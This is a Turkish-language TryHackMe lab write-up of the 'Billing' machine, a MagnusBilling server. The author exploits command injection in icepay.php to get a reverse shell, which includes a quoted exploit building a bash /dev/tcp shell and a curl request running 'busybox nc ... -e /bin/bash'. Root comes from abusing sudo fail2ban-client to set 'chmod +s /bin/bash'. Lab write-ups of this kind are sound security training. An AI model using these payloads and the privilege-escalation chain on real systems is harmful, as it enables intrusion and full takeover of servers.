---
title: 'TryHackMe | Billing WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [command injection, fail2ban, sudo]
render_with_liquid: false
media_subpath: /images/tryhackme_billing/
image:
  path: logo.webp
---

## Özet

Magnus Billing isimli web uygulamasında bir command injection zafiyeti olduğunu tespit edeceğiz. Bu zafiyeti sömürdükten sonra fail2ban-client programını parola kullanmadan root haklarında çalıştırabileceğimizi öğreneceğiz. Aktif bir işleme kural atadıktan sonra ise yetki yükselteceğiz.

## Keşif aşaması

### Nmap taraması

```console
$ nmap -sV -sC -T4 10.10.66.239
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.66.239/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)
3306/tcp open  mysql   MariaDB (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 80 numaralı portun incelenmesi

![](1.webp){: width="1200" height="600" }

Web uygulamasının başlığında `MagnusBilling` adında bir ifade bulunuyor ve ana sayfaya gittiğimizde bizi /mbilling/ adresine yönlendiriyor. Dolayısıyla hazır bir sistem kullanıyor olabileceğini düşündüm. İnternette yaptığım kısa bir aramadan sonra [bu](https://github.com/hadrian3689/magnus_billing_rce/blob/main/magnus_rce.py) exploit ile karşılaştım. Güvenlik açığını sömüren fonksiyon aşağıdaki şekildedir.

```py
def exploit(self):
    requests.packages.urllib3.disable_warnings()
    print("Sending payload...")
    payload = "bash -c 'bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1'"
    encoded_payload_1 = self.convert_to_b64(payload)
    encoded_payload_2 = self.convert_to_b64(encoded_payload_1)
    target_url = self.url + "lib/icepay/icepay.php?democ=null;echo " + encoded_payload_2 + "|base64 -d|base64 -d|sh;null"
    upload_req = requests.get(target_url,verify=False)
```

Gördüğünüz üzere verilen lhost ve lport bilgisiyle bir payload oluşturuyor, oluşturduğu payloadı iki kez `base64` ile kodluyor, daha sonra ise `icepay.php` sayfasına `democ` parametresi ile beraber gönderiyor. Tabi göndermeden önce payloada bir kaç komut daha giriyor. base64 ile kodlanmış komutun çalışması için çözülmesi gerek.

## Sömürü aşaması

Payloadı base64 ile kodlamamıza gerek yok, herhalde bir sorun ile karşılaşmak istemediğinden doğrudan o şekilde payloadı gönderiyor.

```console
$ curl 'http://10.10.66.239/mbilling/lib/icepay/icepay.php?democ=;busybox+nc+10.21.66.61+1234+-e+/bin/bash;'
```

Sistemde ncat aracının bulunduğunu tahmin ettim ve dinlediğim `1234` numaralı port üzerinden bağlantı alabilmek için yukarıda gördüğünüz komutu kullandım. Herhangi bir sorun çıkarmadan bağlantımı alabildim.

```console
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.21.66.61] from (UNKNOWN) [10.10.66.239] 43226
id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
```

Bu arada command injection zafiyetine sebep olan kod bloğunu aşağıda görebilirsiniz.

```php
if (isset($_GET['democ'])) {
    if (strlen($_GET['democ']) > 5) {
        exec("touch " . $_GET['democ'] . '.txt');
    } else {
        exec("rm -rf *.txt");
    }
}
```

## Yetki yükseltme

### root

Kullanıcının sudo yetkilerini görüntülediğimizde fail2ban-client adında bir dosyayı parola kullanmadan root haklarıyla çalıştırabileceğimizi görüyoruz.

```console
asterisk@Billing:/home/magnus$ sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

fail2ban-client aracı fail2ban ile etkileşim kurmak adına kullanılan bir yardımcı araçtır. fail2ban ise belirli kurallar dahilinde sistemdeki olağandışı hareketleri tespit eden ve tespit ettiği olaylara müdahale eden bir araçtır.

```console
asterisk@Billing:/home/magnus$ sudo -u root /usr/bin/fail2ban-client status
Status
|- Number of jail:      8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
```

Gördüğünüz üzere sekiz adet aktif işlem var.

```console
...
[mbilling_login]
enabled  = true
filter   = mbilling_login
action   = iptables-allports[name=mbilling_login, port=all, protocol=all]
logpath  = /var/www/html/mbilling/protected/runtime/application.log
maxretry = 3
bantime = 300

[ip-blacklist]
enabled   = true
filter    = ip-blacklist
action    = iptables-allports[name=ASTERISK, protocol=all] 
logpath   = /var/www/html/mbilling/resources/ip.blacklist
maxretry  = 0
findtime  = 15552000
bantime   = -1


[sshd]
enablem=true

[mbilling_ddos]
enabled  = true
filter   = mbilling_ddos
action   = iptables-allports[name=mbilling_ddos, port=all, protocol=all]
logpath  = /var/log/apache2/error.log
maxretry = 20
bantime = 3600
```

Yukarıda aktif işlemlerin bir kısmı bulunuyor. Her birine birer log dosyası verilmiş ve olandığışı bir hareket olduğu durumda belirtilen eylemi yapması söylenmiş. fail2ban-client aracından yararlaranak bu şekilde bir işlem oluşturmamız veya halihazırda olan bir işlemi düzenlememiz gerekiyor. Yukarıda gördüğünüz üzere `sshd` dışındaki tüm işlemlerin kuralları belirtilmiş. sshd'ye bir kural atamayı ve shell almayı deneyelim.

```console
asterisk@Billing:/home/magnus$  sudo -u root /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "chmod +s /bin/bash"
```

Öncelikle `sshd`'nin eylemini `chmod +s /bin/bash` komutu ile değiştiriyoruz. Böylelikle bir sorun ile karşılaştığında `/bin/bash` dosyasına `SUID` biti atayacak. Daha sonra rastgele bir IP adresini banlıyoruz. Böylelikle belirttiğimiz komut root haklarında çalıştırılıyor ve `/bin/bash` dosyasına `SUID` biti atılıyor.

```console
asterisk@Billing:/home/magnus$ sudo -u root /usr/bin/fail2ban-client set sshd banip 1.2.3.4
asterisk@Billing:/home/magnus$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
asterisk@Billing:/home/magnus$ bash -p
bash-5.1# id
uid=1001(asterisk) gid=1001(asterisk) euid=0(root) egid=0(root) groups=0(root),1001(asterisk)
```

`bash -p` komutunu kullandıktan sonra ise root haklarına sahip oluyoruz.
